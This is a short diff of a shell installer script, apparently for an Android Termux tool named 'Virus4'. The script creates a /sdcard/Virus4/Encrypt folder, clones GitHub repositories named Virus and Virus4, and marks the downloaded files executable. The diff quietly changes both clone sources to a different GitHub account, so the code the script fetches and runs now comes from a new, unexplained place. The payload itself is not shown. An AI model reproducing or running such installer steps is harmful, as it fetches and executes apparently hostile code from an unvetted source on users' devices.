@@ -70,7 +70,7 @@ if [ "$download" -eq "1"  ]; then
  mkdir /sdcard/Virus4
  mkdir /sdcard/Virus4/Encrypt
  cd
- git clone https://github.com/amerlaceset/Virus
+ git clone https://github.com/ameraraibia168/Virus
  cd
  cd Virus
  mv -v Virus4.zip $HOME
@@ -156,7 +156,7 @@ elif [ "$download" -eq "2"  ]; then
  echo -e "$g+++++++++++++++>$p[Please Wait]$g<++++++++++++++"
  sleep 0.4
  cd
- git clone https://github.com/amerlaceset/Virus4
+ git clone https://github.com/ameraraibia168/Virus4
  cd Virus4
  chmod +x *
  clear
